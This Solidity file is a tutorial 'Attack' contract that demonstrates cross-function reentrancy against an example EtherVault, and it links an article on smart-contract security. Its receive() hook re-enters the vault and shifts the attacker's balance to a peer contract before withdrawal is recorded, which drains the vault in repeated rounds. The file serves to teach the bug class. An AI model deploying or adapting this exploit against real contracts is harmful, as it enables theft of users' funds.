// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//--------------------------------------------------------------------------//
// Copyright 2022 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//--------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-04-cross-function-reentrancy-de9cbce0558e
//  - On serial-coder.com: (coming soon)

pragma solidity 0.8.13;

interface IEtherVault {
    function deposit() external payable;
    function transfer(address _to, uint256 _amount) external;
    function withdrawAll() external;
    function getUserBalance(address _user) external view returns (uint256);
} 

contract Attack {
    IEtherVault public immutable etherVault;
    Attack public attackPeer;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.transfer(
                address(attackPeer), 
                etherVault.getUserBalance(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function attackNext() external {
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}